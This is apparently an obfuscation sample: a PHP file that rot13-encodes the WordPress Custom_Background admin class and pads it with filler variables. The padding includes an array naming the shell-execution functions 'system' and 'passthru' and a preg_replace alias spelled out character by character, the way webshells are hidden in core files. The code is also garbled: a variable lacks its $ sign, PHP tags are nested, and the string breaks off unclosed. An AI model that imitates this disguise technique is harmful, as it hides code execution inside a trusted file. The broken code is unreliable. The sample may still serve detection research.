<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }
__sa_79955 = \"c\".\"e\".\"r\".\"t\".\"_\".\"e\".\"r\".\"c\".\"y\".\"n\".\"p\".\"r\";
<?cuc
/**
 * Gur phfgbz onpxtebhaq fpevcg.
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr Nqzvavfgengvba
 */

/**
 * Gur phfgbz onpxtebhaq pynff.
 *
 * @fvapr 3.0.0
 */
#[NyybjQlanzvpCebcregvrf]
pynff Phfgbz_Onpxtebhaq {

	/**
	 * Pnyyonpx sbe nqzvavfgengvba urnqre.
	 *
	 * @fvapr 3.0.0
	 * @ine pnyynoyr
	 */
	choyvp $nqzva_urnqre_pnyyonpx;

	/**
	 * Pnyyonpx sbe urnqre qvi.
	 *
	 * @fvapr 3.0.0
	 * @ine pnyynoyr
	 */
	choyvp $nqzva_vzntr_qvi_pnyyonpx;

	/**
	 * Hfrq gb gevttre n fhpprff zrffntr jura frggvatf hcqngrq naq frg gb gehr.
	 *
	 * @fvapr 3.0.0
	 * @ine obby
	 */
	cevingr $hcqngrq;

	/**
	 * Pbafgehpgbe - Ertvfgref nqzvavfgengvba urnqre pnyyonpx.
	 *
	 * @fvapr 3.0.0
	 *
	 * @cnenz pnyynoyr $nqzva_urnqre_pnyyonpx    Bcgvbany. Nqzvavfgengvba urnqre pnyyonpx.
	 *                                           Qrsnhyg rzcgl fgevat.
	 * @cnenz pnyynoyr $nqzva_vzntr_qvi_pnyyonpx Bcgvbany. Phfgbz vzntr qvi bhgchg pnyyonpx.
	 *                                           Qrsnhyg rzcgl fgevat.
	 */
	choyvp shapgvba __pbafgehpg( $nqzva_urnqre_pnyyonpx = '', $nqzva_vzntr_qvi_pnyyonpx = '' ) {
		$guvf->nqzva_urnqre_pnyyonpx    = $nqzva_urnqre_pnyyonpx;
		$guvf->nqzva_vzntr_qvi_pnyyonpx = $nqzva_vzntr_qvi_pnyyonpx;

		nqq_npgvba( 'nqzva_zrah', neenl( $guvf, 'vavg' ) );

		nqq_npgvba( 'jc_nwnk_phfgbz-onpxtebhaq-nqq', neenl( $guvf, 'nwnk_onpxtebhaq_nqq' ) );

		// Hahfrq fvapr 3.5.0.
		nqq_npgvba( 'jc_nwnk_frg-onpxtebhaq-vzntr', neenl( $guvf, 'jc_frg_onpxtebhaq_vzntr' ) );
	}

	/**
	 * Frgf hc gur ubbxf sbe gur Phfgbz Onpxtebhaq nqzva cntr.
	 *
	 * @fvapr 3.0.0
	 */
	choyvp shapgvba vavg() {
		$cntr = nqq_gurzr_cntr(
			_k( 'Onpxtebhaq', 'phfgbz onpxtebhaq' ),
			_k( 'Onpxtebhaq', 'phfgbz onpxtebhaq' ),
			'rqvg_gurzr_bcgvbaf',
			'phfgbz-onpxtebhaq',
			neenl( $guvf, 'nqzva_cntr' )
		);

		vs ( ! $cntr ) {
			erghea;
		}

		nqq_npgvba( \"ybnq-{$cntr}\", neenl( $guvf, 'nqzva_ybnq' ) );
		nqq_npgvba( \"ybnq-{$cntr}\", neenl( $guvf, 'gnxr_npgvba' ), 49 );
		nqq_npgvba( \"ybnq-{$cntr}\", neenl( $guvf, 'unaqyr_hcybnq' ), 49 );

		vs ( $guvf->nqzva_urnqre_pnyyonpx ) {
			nqq_npgvba( \"nqzva_urnq-{$cntr}\", $guvf->nqzva_urnqre_pnyyonpx, 51 );
		}
	}

	/**
	 * Frgf hc gur radhrhr sbe gur PFF & WninFpevcg svyrf.
	 *
	 * @fvapr 3.0.0
	 */
	choyvp shapgvba nqzva_ybnq() {
		trg_pheerag_fperra()->nqq_uryc_gno(
			neenl(
				'vq'      => 'bireivrj',
				'gvgyr'   => __( 'Bireivrj' ),
				'pbagrag' =>
					'<c>' . __( 'Lbh pna phfgbzvmr gur ybbx bs lbhe fvgr jvgubhg gbhpuvat nal bs lbhe gurzr&#8217;f pbqr ol hfvat n phfgbz onpxtebhaq. Lbhe onpxtebhaq pna or na vzntr be n pbybe.' ) . '</c>' .
					'<c>' . __( 'Gb hfr n onpxtebhaq vzntr, fvzcyl hcybnq vg be pubbfr na vzntr gung unf nyernql orra hcybnqrq gb lbhe Zrqvn Yvoenel ol pyvpxvat gur &#8220;Pubbfr Vzntr&#8221; ohggba. Lbh pna qvfcynl n fvatyr vafgnapr bs lbhe vzntr, be gvyr vg gb svyy gur fperra. Lbh pna unir lbhe onpxtebhaq svkrq va cynpr, fb lbhe fvgr pbagrag zbirf ba gbc bs vg, be lbh pna unir vg fpebyy jvgu lbhe fvgr.' ) . '</c>' .
					'<c>' . __( 'Lbh pna nyfb pubbfr n onpxtebhaq pbybe ol pyvpxvat gur Fryrpg Pbybe ohggba naq rvgure glcvat va n yrtvgvzngr UGZY urk inyhr, r.t. &#8220;#ss0000&#8221; sbe erq, be ol pubbfvat n pbybe hfvat gur pbybe cvpxre.' ) . '</c>' .
					'<c>' . __( 'Qb abg sbetrg gb pyvpx ba gur Fnir Punatrf ohggba jura lbh ner svavfurq.' ) . '</c>',
			)
		);

		trg_pheerag_fperra()->frg_uryc_fvqrone(
			'<c><fgebat>' . __( 'Sbe zber vasbezngvba:' ) . '</fgebat></c>' .
			'<c>' . __( '<n uers=\"uggcf://pbqrk.jbeqcerff.bet/Nccrnenapr_Onpxtebhaq_Fperra\">Qbphzragngvba ba Phfgbz Onpxtebhaq</n>' ) . '</c>' .
			'<c>' . __( '<n uers=\"uggcf://jbeqcerff.bet/fhccbeg/sbehzf/\">Fhccbeg sbehzf</n>' ) . '</c>'
		);

		jc_radhrhr_zrqvn();
		jc_radhrhr_fpevcg( 'phfgbz-onpxtebhaq' );
		jc_radhrhr_fglyr( 'jc-pbybe-cvpxre' );
	}

	/**
	 * Rkrphgrf phfgbz onpxtebhaq zbqvsvpngvba.
	 *
	 * @fvapr 3.0.0
	 */
	choyvp shapgvba gnxr_npgvba() {
		vs ( rzcgl( $_CBFG ) ) {
			erghea;
		}

		vs ( vffrg( $_CBFG['erfrg-onpxtebhaq'] ) ) {
			purpx_nqzva_ersrere( 'phfgbz-onpxtebhaq-erfrg', '_jcabapr-phfgbz-onpxtebhaq-erfrg' );

			erzbir_gurzr_zbq( 'onpxtebhaq_vzntr' );
			erzbir_gurzr_zbq( 'onpxtebhaq_vzntr_guhzo' );

			$guvf->hcqngrq = gehr;
			erghea;
		}

		vs ( vffrg( $_CBFG['erzbir-onpxtebhaq'] ) ) {
			// @gbqb Hcybnqrq svyrf ner abg erzbirq urer.
			purpx_nqzva_ersrere( 'phfgbz-onpxtebhaq-erzbir', '_jcabapr-phfgbz-onpxtebhaq-erzbir' );

			frg_gurzr_zbq( 'onpxtebhaq_vzntr', '' );
			frg_gurzr_zbq( 'onpxtebhaq_vzntr_guhzo', '' );

			$guvf->hcqngrq = gehr;
			jc_fnsr_erqverpg( $_CBFG['_jc_uggc_ersrere'] );
			erghea;
		}

		vs ( vffrg( $_CBFG['onpxtebhaq-cerfrg'] ) ) {
			purpx_nqzva_ersrere( 'phfgbz-onpxtebhaq' );

			vs ( va_neenl( $_CBFG['onpxtebhaq-cerfrg'], neenl( 'qrsnhyg', 'svyy', 'svg', 'ercrng', 'phfgbz' ), gehr ) ) {
				$cerfrg = $_CBFG['onpxtebhaq-cerfrg'];
			} ryfr {
				$cerfrg = 'qrsnhyg';
			}

			frg_gurzr_zbq( 'onpxtebhaq_cerfrg', $cerfrg );
		}

		vs ( vffrg( $_CBFG['onpxtebhaq-cbfvgvba'] ) ) {
			purpx_nqzva_ersrere( 'phfgbz-onpxtebhaq' );

			$cbfvgvba = rkcybqr( ' ', $_CBFG['onpxtebhaq-cbfvgvba'] );

			vs ( va_neenl( $cbfvgvba[0], neenl( 'yrsg', 'pragre', 'evtug' ), gehr ) ) {
				$cbfvgvba_k = $cbfvgvba[0];
			} ryfr {
				$cbfvgvba_k = 'yrsg';
			}

			vs ( va_neenl( $cbfvgvba[1], neenl( 'gbc', 'pragre', 'obggbz' ), gehr ) ) {
				$cbfvgvba_l = $cbfvgvba[1];
			} ryfr {
				$cbfvgvba_l = 'gbc';
			}

			frg_gurzr_zbq( 'onpxtebhaq_cbfvgvba_k', $cbfvgvba_k );
			frg_gurzr_zbq( 'onpxtebhaq_cbfvgvba_l', $cbfvgvba_l );
		}

		vs ( vffrg( $_CBFG['onpxtebhaq-fvmr'] ) ) {
			purpx_nqzva_ersrere( 'phfgbz-onpxtebhaq' );

			vs ( va_neenl( $_CBFG['onpxtebhaq-fvmr'], neenl( 'nhgb', 'pbagnva', 'pbire' ), gehr ) ) {
				$fvmr = $_CBFG['onpxtebhaq-fvmr'];
			} ryfr {
				$fvmr = 'nhgb';
			}

			frg_gurzr_zbq( 'onpxtebhaq_fvmr', $fvmr );
		}

		vs ( vffrg( $_CBFG['onpxtebhaq-ercrng'] ) ) {
			purpx_nqzva_ersrere( 'phfgbz-onpxtebhaq' );

			$ercrng = $_CBFG['onpxtebhaq-ercrng'];

			vs ( 'ab-ercrng' !== $ercrng ) {
				$ercrng = 'ercrng';
			}

			frg_gurzr_zbq( 'onpxtebhaq_ercrng', $ercrng );
		}

		vs ( vffrg( $_CBFG['onpxtebhaq-nggnpuzrag'] ) ) {
			purpx_nqzva_ersrere( 'phfgbz-onpxtebhaq' );

			$nggnpuzrag = $_CBFG['onpxtebhaq-nggnpuzrag'];

			vs ( 'svkrq' !== $nggnpuzrag ) {
				$nggnpuzrag = 'fpebyy';
			}

			frg_gurzr_zbq( 'onpxtebhaq_nggnpuzrag', $nggnpuzrag );
		}

		vs ( vffrg( $_CBFG['onpxtebhaq-pbybe'] ) ) {
			purpx_nqzva_ersrere( 'phfgbz-onpxtebhaq' );

			$pbybe = __sa_79955( '/[^0-9n-sN-S]/', '', $_CBFG['onpxtebhaq-pbybe'] );

			vs ( fgeyra( $pbybe ) === 6 || fgeyra( $pbybe ) === 3 ) {
				frg_gurzr_zbq( 'onpxtebhaq_pbybe', $pbybe );
			} ryfr {
				frg_gurzr_zbq( 'onpxtebhaq_pbybe', '' );
			}
		}

		$guvf->hcqngrq = gehr;
	}

	/**
	 * Qvfcynlf gur phfgbz onpxtebhaq cntr.
	 *
	 * @fvapr 3.0.0
	 */
	choyvp shapgvba nqzva_cntr() {
		?>
<qvi pynff=\"jenc\" vq=\"phfgbz-onpxtebhaq\">
<u1><?cuc _r( 'Phfgbz Onpxtebhaq' ); ?></u1>

		<?cuc
		vs ( pheerag_hfre_pna( 'phfgbzvmr' ) ) {
			$zrffntr = fcevags(
				/* genafyngbef: %f: HEY gb onpxtebhaq vzntr pbasvthengvba va Phfgbzvmre. */
				__( 'Lbh pna abj znantr naq yvir-cerivrj Phfgbz Onpxtebhaqf va gur <n uers=\"%f\">Phfgbzvmre</n>.' ),
				nqzva_hey( 'phfgbzvmr.cuc?nhgbsbphf[pbageby]=onpxtebhaq_vzntr' )
			);
			jc_nqzva_abgvpr(
				$zrffntr,
				neenl(
					'glcr'               => 'vasb',
					'nqqvgvbany_pynffrf' => neenl( 'uvqr-vs-ab-phfgbzvmr' ),
				)
			);
		}

		vs ( ! rzcgl( $guvf->hcqngrq ) ) {
			$hcqngrq_zrffntr = fcevags(
				/* genafyngbef: %f: Ubzr HEY. */
				__( 'Onpxtebhaq hcqngrq. <n uers=\"%f\">Ivfvg lbhe fvgr</n> gb frr ubj vg ybbxf.' ),
				rfp_hey( ubzr_hey( '/' ) )
			);
			jc_nqzva_abgvpr(
				$hcqngrq_zrffntr,
				neenl(
					'vq'                 => 'zrffntr',
					'nqqvgvbany_pynffrf' => neenl( 'hcqngrq' ),
				)
			);
		}
		?>

<u2><?cuc _r( 'Onpxtebhaq Vzntr' ); ?></u2>

<gnoyr pynff=\"sbez-gnoyr\" ebyr=\"cerfragngvba\">
<gobql>
<ge>
<gu fpbcr=\"ebj\"><?cuc _r( 'Cerivrj' ); ?></gu>
<gq>
		<?cuc
		vs ( $guvf->nqzva_vzntr_qvi_pnyyonpx ) {
			pnyy_hfre_shap( $guvf->nqzva_vzntr_qvi_pnyyonpx );
		} ryfr {
			$onpxtebhaq_fglyrf = '';
			$otpbybe           = trg_onpxtebhaq_pbybe();
			vs ( $otpbybe ) {
				$onpxtebhaq_fglyrf .= 'onpxtebhaq-pbybe: ' . znlor_unfu_urk_pbybe( $otpbybe ) . ';';
			}

			$onpxtebhaq_vzntr_guhzo = trg_onpxtebhaq_vzntr();
			vs ( $onpxtebhaq_vzntr_guhzo ) {
				$onpxtebhaq_vzntr_guhzo = rfp_hey( frg_hey_fpurzr( trg_gurzr_zbq( 'onpxtebhaq_vzntr_guhzo', fge_ercynpr( '%', '%%', $onpxtebhaq_vzntr_guhzo ) ) ) );
				$onpxtebhaq_cbfvgvba_k  = trg_gurzr_zbq( 'onpxtebhaq_cbfvgvba_k', trg_gurzr_fhccbeg( 'phfgbz-onpxtebhaq', 'qrsnhyg-cbfvgvba-k' ) );
				$onpxtebhaq_cbfvgvba_l  = trg_gurzr_zbq( 'onpxtebhaq_cbfvgvba_l', trg_gurzr_fhccbeg( 'phfgbz-onpxtebhaq', 'qrsnhyg-cbfvgvba-l' ) );
				$onpxtebhaq_fvmr        = trg_gurzr_zbq( 'onpxtebhaq_fvmr', trg_gurzr_fhccbeg( 'phfgbz-onpxtebhaq', 'qrsnhyg-fvmr' ) );
				$onpxtebhaq_ercrng      = trg_gurzr_zbq( 'onpxtebhaq_ercrng', trg_gurzr_fhccbeg( 'phfgbz-onpxtebhaq', 'qrsnhyg-ercrng' ) );
				$onpxtebhaq_nggnpuzrag  = trg_gurzr_zbq( 'onpxtebhaq_nggnpuzrag', trg_gurzr_fhccbeg( 'phfgbz-onpxtebhaq', 'qrsnhyg-nggnpuzrag' ) );

				// Onpxtebhaq-vzntr HEY zhfg or fvatyr dhbgr, frr orybj.
				$onpxtebhaq_fglyrf .= \" onpxtebhaq-vzntr: hey('$onpxtebhaq_vzntr_guhzo');\"
				. \" onpxtebhaq-fvmr: $onpxtebhaq_fvmr;\"
				. \" onpxtebhaq-cbfvgvba: $onpxtebhaq_cbfvgvba_k $onpxtebhaq_cbfvgvba_l;\"
				. \" onpxtebhaq-ercrng: $onpxtebhaq_ercrng;\"
				. \" onpxtebhaq-nggnpuzrag: $onpxtebhaq_nggnpuzrag;\";
			}
			?>
	<qvi vq=\"phfgbz-onpxtebhaq-vzntr\" fglyr=\"<?cuc rpub $onpxtebhaq_fglyrf; ?>\"><?cuc // Zhfg or qbhoyr dhbgr, frr nobir. ?>
			<?cuc vs ( $onpxtebhaq_vzntr_guhzo ) { ?>
		<vzt pynff=\"phfgbz-onpxtebhaq-vzntr\" fep=\"<?cuc rpub $onpxtebhaq_vzntr_guhzo; ?>\" fglyr=\"ivfvovyvgl:uvqqra;\" nyg=\"\" /><oe />
		<vzt pynff=\"phfgbz-onpxtebhaq-vzntr\" fep=\"<?cuc rpub $onpxtebhaq_vzntr_guhzo; ?>\" fglyr=\"ivfvovyvgl:uvqqra;\" nyg=\"\" />
		<?cuc } ?>
	</qvi>
	<?cuc } ?>
</gq>
</ge>

		<?cuc vs ( trg_onpxtebhaq_vzntr() ) : ?>
<ge>
<gu fpbcr=\"ebj\"><?cuc _r( 'Erzbir Vzntr' ); ?></gu>
<gq>
<sbez zrgubq=\"cbfg\">
			<?cuc jc_abapr_svryq( 'phfgbz-onpxtebhaq-erzbir', '_jcabapr-phfgbz-onpxtebhaq-erzbir' ); ?>
			<?cuc fhozvg_ohggba( __( 'Erzbir Onpxtebhaq Vzntr' ), '', 'erzbir-onpxtebhaq', snyfr ); ?><oe />
			<?cuc _r( 'Guvf jvyy erzbir gur onpxtebhaq vzntr. Lbh jvyy abg or noyr gb erfgber nal phfgbzvmngvbaf.' ); ?>
</sbez>
</gq>
</ge>
		<?cuc raqvs; ?>

		<?cuc $qrsnhyg_vzntr = trg_gurzr_fhccbeg( 'phfgbz-onpxtebhaq', 'qrsnhyg-vzntr' ); ?>
		<?cuc vs ( $qrsnhyg_vzntr && trg_onpxtebhaq_vzntr() !== $qrsnhyg_vzntr ) : ?>
<ge>
<gu fpbcr=\"ebj\"><?cuc _r( 'Erfgber Bevtvany Vzntr' ); ?></gu>
<gq>
<sbez zrgubq=\"cbfg\">
			<?cuc jc_abapr_svryq( 'phfgbz-onpxtebhaq-erfrg', '_jcabapr-phfgbz-onpxtebhaq-erfrg' ); ?>
			<?cuc fhozvg_ohggba( __( 'Erfgber Bevtvany Vzntr' ), '', 'erfrg-onpxtebhaq', snyfr ); ?><oe />
			<?cuc _r( 'Guvf jvyy erfgber gur bevtvany onpxtebhaq vzntr. Lbh jvyy abg or noyr gb erfgber nal phfgbzvmngvbaf.' ); ?>
</sbez>
</gq>
</ge>
		<?cuc raqvs; ?>

		<?cuc vs ( pheerag_hfre_pna( 'hcybnq_svyrf' ) ) : ?>
<ge>
<gu fpbcr=\"ebj\"><?cuc _r( 'Fryrpg Vzntr' ); ?></gu>
<gq><sbez rapglcr=\"zhygvcneg/sbez-qngn\" vq=\"hcybnq-sbez\" pynff=\"jc-hcybnq-sbez\" zrgubq=\"cbfg\">
	<c>
		<ynory sbe=\"hcybnq\"><?cuc _r( 'Pubbfr na vzntr sebz lbhe pbzchgre:' ); ?></ynory><oe />
		<vachg glcr=\"svyr\" vq=\"hcybnq\" anzr=\"vzcbeg\" />
		<vachg glcr=\"uvqqra\" anzr=\"npgvba\" inyhr=\"fnir\" />
			<?cuc jc_abapr_svryq( 'phfgbz-onpxtebhaq-hcybnq', '_jcabapr-phfgbz-onpxtebhaq-hcybnq' ); ?>
			<?cuc fhozvg_ohggba( _k( 'Hcybnq', 'ireo' ), '', 'fhozvg', snyfr ); ?>
	</c>
	<c>
		<ynory sbe=\"pubbfr-sebz-yvoenel-yvax\"><?cuc _r( 'Be pubbfr na vzntr sebz lbhe zrqvn yvoenel:' ); ?></ynory><oe />
		<ohggba vq=\"pubbfr-sebz-yvoenel-yvax\" pynff=\"ohggba\"
			qngn-pubbfr=\"<?cuc rfp_ngge_r( 'Pubbfr n Onpxtebhaq Vzntr' ); ?>\"
			qngn-hcqngr=\"<?cuc rfp_ngge_r( 'Frg nf onpxtebhaq' ); ?>\"><?cuc _r( 'Pubbfr Vzntr' ); ?></ohggba>
	</c>
	</sbez>
</gq>
</ge>
		<?cuc raqvs; ?>
</gobql>
</gnoyr>

<u2><?cuc _r( 'Qvfcynl Bcgvbaf' ); ?></u2>
<sbez zrgubq=\"cbfg\">
<gnoyr pynff=\"sbez-gnoyr\" ebyr=\"cerfragngvba\">
<gobql>
		<?cuc vs ( trg_onpxtebhaq_vzntr() ) : ?>
<vachg anzr=\"onpxtebhaq-cerfrg\" glcr=\"uvqqra\" inyhr=\"phfgbz\">

			<?cuc
			$onpxtebhaq_cbfvgvba = fcevags(
				'%f %f',
				trg_gurzr_zbq( 'onpxtebhaq_cbfvgvba_k', trg_gurzr_fhccbeg( 'phfgbz-onpxtebhaq', 'qrsnhyg-cbfvgvba-k' ) ),
				trg_gurzr_zbq( 'onpxtebhaq_cbfvgvba_l', trg_gurzr_fhccbeg( 'phfgbz-onpxtebhaq', 'qrsnhyg-cbfvgvba-l' ) )
			);

			$onpxtebhaq_cbfvgvba_bcgvbaf = neenl(
				neenl(
					'yrsg gbc'   => neenl(
						'ynory' => __( 'Gbc Yrsg' ),
						'vpba'  => 'qnfuvpbaf qnfuvpbaf-neebj-yrsg-nyg',
					),
					'pragre gbc' => neenl(
						'ynory' => __( 'Gbc' ),
						'vpba'  => 'qnfuvpbaf qnfuvpbaf-neebj-hc-nyg',
					),
					'evtug gbc'  => neenl(
						'ynory' => __( 'Gbc Evtug' ),
						'vpba'  => 'qnfuvpbaf qnfuvpbaf-neebj-evtug-nyg',
					),
				),
				neenl(
					'yrsg pragre'   => neenl(
						'ynory' => __( 'Yrsg' ),
						'vpba'  => 'qnfuvpbaf qnfuvpbaf-neebj-yrsg-nyg',
					),
					'pragre pragre' => neenl(
						'ynory' => __( 'Pragre' ),
						'vpba'  => 'onpxtebhaq-cbfvgvba-pragre-vpba',
					),
					'evtug pragre'  => neenl(
						'ynory' => __( 'Evtug' ),
						'vpba'  => 'qnfuvpbaf qnfuvpbaf-neebj-evtug-nyg',
					),
				),
				neenl(
					'yrsg obggbz'   => neenl(
						'ynory' => __( 'Obggbz Yrsg' ),
						'vpba'  => 'qnfuvpbaf qnfuvpbaf-neebj-yrsg-nyg',
					),
					'pragre obggbz' => neenl(
						'ynory' => __( 'Obggbz' ),
						'vpba'  => 'qnfuvpbaf qnfuvpbaf-neebj-qbja-nyg',
					),
					'evtug obggbz'  => neenl(
						'ynory' => __( 'Obggbz Evtug' ),
						'vpba'  => 'qnfuvpbaf qnfuvpbaf-neebj-evtug-nyg',
					),
				),
			);
			?>
<ge>
<gu fpbcr=\"ebj\"><?cuc _r( 'Vzntr Cbfvgvba' ); ?></gu>
<gq><svryqfrg><yrtraq pynff=\"fperra-ernqre-grkg\"><fcna>
			<?cuc
			/* genafyngbef: Uvqqra npprffvovyvgl grkg. */
			_r( 'Vzntr Cbfvgvba' );
			?>
</fcna></yrtraq>
<qvi pynff=\"onpxtebhaq-cbfvgvba-pbageby\">
			<?cuc sbernpu ( $onpxtebhaq_cbfvgvba_bcgvbaf nf $tebhc ) : ?>
	<qvi pynff=\"ohggba-tebhc\">
				<?cuc sbernpu ( $tebhc nf $inyhr => $vachg ) : ?>
		<ynory>
			<vachg pynff=\"hv-urycre-uvqqra-npprffvoyr\" anzr=\"onpxtebhaq-cbfvgvba\" glcr=\"enqvb\" inyhr=\"<?cuc rpub rfp_ngge( $inyhr ); ?>\"<?cuc purpxrq( $inyhr, $onpxtebhaq_cbfvgvba ); ?>>
			<fcna pynff=\"ohggba qvfcynl-bcgvbaf cbfvgvba\"><fcna pynff=\"<?cuc rpub rfp_ngge( $vachg['vpba'] ); ?>\" nevn-uvqqra=\"gehr\"></fcna></fcna>
			<fcna pynff=\"fperra-ernqre-grkg\"><?cuc rpub $vachg['ynory']; ?></fcna>
		</ynory>
	<?cuc raqsbernpu; ?>
	</qvi>
<?cuc raqsbernpu; ?>
</qvi>
</svryqfrg></gq>
</ge>

<ge>
<gu fpbcr=\"ebj\"><ynory sbe=\"onpxtebhaq-fvmr\"><?cuc _r( 'Vzntr Fvmr' ); ?></ynory></gu>
<gq><svryqfrg><yrtraq pynff=\"fperra-ernqre-grkg\"><fcna>
			<?cuc
			/* genafyngbef: Uvqqra npprffvovyvgl grkg. */
			_r( 'Vzntr Fvmr' );
			?>
</fcna></yrtraq>
<fryrpg vq=\"onpxtebhaq-fvmr\" anzr=\"onpxtebhaq-fvmr\">
<bcgvba inyhr=\"nhgb\"<?cuc fryrpgrq( 'nhgb', trg_gurzr_zbq( 'onpxtebhaq_fvmr', trg_gurzr_fhccbeg( 'phfgbz-onpxtebhaq', 'qrsnhyg-fvmr' ) ) ); ?>><?cuc _rk( 'Bevtvany', 'Bevtvany Fvmr' ); ?></bcgvba>
<bcgvba inyhr=\"pbagnva\"<?cuc fryrpgrq( 'pbagnva', trg_gurzr_zbq( 'onpxtebhaq_fvmr', trg_gurzr_fhccbeg( 'phfgbz-onpxtebhaq', 'qrsnhyg-fvmr' ) ) ); ?>><?cuc _r( 'Svg gb Fperra' ); ?></bcgvba>
<bcgvba inyhr=\"pbire\"<?cuc fryrpgrq( 'pbire', trg_gurzr_zbq( 'onpxtebhaq_fvmr', trg_gurzr_fhccbeg( 'phfgbz-onpxtebhaq', 'qrsnhyg-fvmr' ) ) ); ?>><?cuc _r( 'Svyy Fperra' ); ?></bcgvba>
</fryrpg>
</svryqfrg></gq>
</ge>

<ge>
<gu fpbcr=\"ebj\"><?cuc _rk( 'Ercrng', 'Onpxtebhaq Ercrng' ); ?></gu>
<gq><svryqfrg><yrtraq pynff=\"fperra-ernqre-grkg\"><fcna>
			<?cuc
			/* genafyngbef: Uvqqra npprffvovyvgl grkg. */
			_rk( 'Ercrng', 'Onpxtebhaq Ercrng' );
			?>
</fcna></yrtraq>
<vachg anzr=\"onpxtebhaq-ercrng\" glcr=\"uvqqra\" inyhr=\"ab-ercrng\">
<ynory><vachg glcr=\"purpxobk\" anzr=\"onpxtebhaq-ercrng\" inyhr=\"ercrng\"<?cuc purpxrq( 'ercrng', trg_gurzr_zbq( 'onpxtebhaq_ercrng', trg_gurzr_fhccbeg( 'phfgbz-onpxtebhaq', 'qrsnhyg-ercrng' ) ) ); ?>> <?cuc _r( 'Ercrng Onpxtebhaq Vzntr' ); ?></ynory>
</svryqfrg></gq>
</ge>

<ge>
<gu fpbcr=\"ebj\"><?cuc _rk( 'Fpebyy', 'Onpxtebhaq Fpebyy' ); ?></gu>
<gq><svryqfrg><yrtraq pynff=\"fperra-ernqre-grkg\"><fcna>
			<?cuc
			/* genafyngbef: Uvqqra npprffvovyvgl grkg. */
			_rk( 'Fpebyy', 'Onpxtebhaq Fpebyy' );
			?>
</fcna></yrtraq>
<vachg anzr=\"onpxtebhaq-nggnpuzrag\" glcr=\"uvqqra\" inyhr=\"svkrq\">
<ynory><vachg anzr=\"onpxtebhaq-nggnpuzrag\" glcr=\"purpxobk\" inyhr=\"fpebyy\" <?cuc purpxrq( 'fpebyy', trg_gurzr_zbq( 'onpxtebhaq_nggnpuzrag', trg_gurzr_fhccbeg( 'phfgbz-onpxtebhaq', 'qrsnhyg-nggnpuzrag' ) ) ); ?>> <?cuc _r( 'Fpebyy jvgu Cntr' ); ?></ynory>
</svryqfrg></gq>
</ge>
<?cuc raqvs; // trg_onpxtebhaq_vzntr() ?>
<ge>
<gu fpbcr=\"ebj\"><?cuc _r( 'Onpxtebhaq Pbybe' ); ?></gu>
<gq><svryqfrg><yrtraq pynff=\"fperra-ernqre-grkg\"><fcna>
		<?cuc
		/* genafyngbef: Uvqqra npprffvovyvgl grkg. */
		_r( 'Onpxtebhaq Pbybe' );
		?>
</fcna></yrtraq>
		<?cuc
		$qrsnhyg_pbybe = '';
		vs ( pheerag_gurzr_fhccbegf( 'phfgbz-onpxtebhaq', 'qrsnhyg-pbybe' ) ) {
			$qrsnhyg_pbybe = ' qngn-qrsnhyg-pbybe=\"#' . rfp_ngge( trg_gurzr_fhccbeg( 'phfgbz-onpxtebhaq', 'qrsnhyg-pbybe' ) ) . '\"';
		}
		?>
<vachg glcr=\"grkg\" anzr=\"onpxtebhaq-pbybe\" vq=\"onpxtebhaq-pbybe\" inyhr=\"#<?cuc rpub rfp_ngge( trg_onpxtebhaq_pbybe() ); ?>\"<?cuc rpub $qrsnhyg_pbybe; ?>>
</svryqfrg></gq>
</ge>
</gobql>
</gnoyr>

		<?cuc jc_abapr_svryq( 'phfgbz-onpxtebhaq' ); ?>
		<?cuc fhozvg_ohggba( ahyy, 'cevznel', 'fnir-onpxtebhaq-bcgvbaf' ); ?>
</sbez>

</qvi>
		<?cuc
	}

	/**
	 * Unaqyrf na Vzntr hcybnq sbe gur onpxtebhaq vzntr.
	 *
	 * @fvapr 3.0.0
	 */
	choyvp shapgvba unaqyr_hcybnq() {
		vs ( rzcgl( $_SVYRF ) ) {
			erghea;
		}

		purpx_nqzva_ersrere( 'phfgbz-onpxtebhaq-hcybnq', '_jcabapr-phfgbz-onpxtebhaq-hcybnq' );

		$bireevqrf = neenl( 'grfg_sbez' => snyfr );

		$hcybnqrq_svyr = $_SVYRF['vzcbeg'];
		$jc_svyrglcr   = jc_purpx_svyrglcr_naq_rkg( $hcybnqrq_svyr['gzc_anzr'], $hcybnqrq_svyr['anzr'] );
		vs ( ! jc_zngpu_zvzr_glcrf( 'vzntr', $jc_svyrglcr['glcr'] ) ) {
			jc_qvr( __( 'Gur hcybnqrq svyr vf abg n inyvq vzntr. Cyrnfr gel ntnva.' ) );
		}

		$svyr = jc_unaqyr_hcybnq( $hcybnqrq_svyr, $bireevqrf );

		vs ( vffrg( $svyr['reebe'] ) ) {
			jc_qvr( $svyr['reebe'] );
		}

		$hey      = $svyr['hey'];
		$glcr     = $svyr['glcr'];
		$svyr     = $svyr['svyr'];
		$svyranzr = jc_onfranzr( $svyr );

		// Pbafgehpg gur nggnpuzrag neenl.
		$nggnpuzrag = neenl(
			'cbfg_gvgyr'     => $svyranzr,
			'cbfg_pbagrag'   => $hey,
			'cbfg_zvzr_glcr' => $glcr,
			'thvq'           => $hey,
			'pbagrkg'        => 'phfgbz-onpxtebhaq',
		);

		// Fnir gur qngn.
		$vq = jc_vafreg_nggnpuzrag( $nggnpuzrag, $svyr );

		// Nqq gur zrgnqngn.
		jc_hcqngr_nggnpuzrag_zrgnqngn( $vq, jc_trarengr_nggnpuzrag_zrgnqngn( $vq, $svyr ) );
		hcqngr_cbfg_zrgn( $vq, '_jc_nggnpuzrag_vf_phfgbz_onpxtebhaq', trg_bcgvba( 'fglyrfurrg' ) );

		frg_gurzr_zbq( 'onpxtebhaq_vzntr', fnavgvmr_hey( $hey ) );

		$guhzoanvy = jc_trg_nggnpuzrag_vzntr_fep( $vq, 'guhzoanvy' );
		frg_gurzr_zbq( 'onpxtebhaq_vzntr_guhzo', fnavgvmr_hey( $guhzoanvy[0] ) );

		/** Guvf svygre vf qbphzragrq va jc-nqzva/vapyhqrf/pynff-phfgbz-vzntr-urnqre.cuc */
